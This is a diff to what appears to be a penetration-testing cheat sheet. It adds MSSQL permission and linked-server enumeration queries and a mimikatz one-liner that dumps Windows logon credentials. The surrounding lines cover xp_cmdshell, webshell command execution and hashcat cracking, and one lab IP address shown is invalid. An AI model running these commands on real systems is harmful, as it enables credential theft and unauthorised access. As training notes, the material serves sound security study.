@@ -1147,6 +1147,10 @@ EXECUTE xp_cmdshell 'whoami';
 #Now we can exploit it
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 ```
+```powershell
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+EXEC sp_linkedservers;
+```
 
 ---
 
@@ -1860,6 +1864,7 @@ hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
 ```powershell
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
 - Obtaining Domain SID
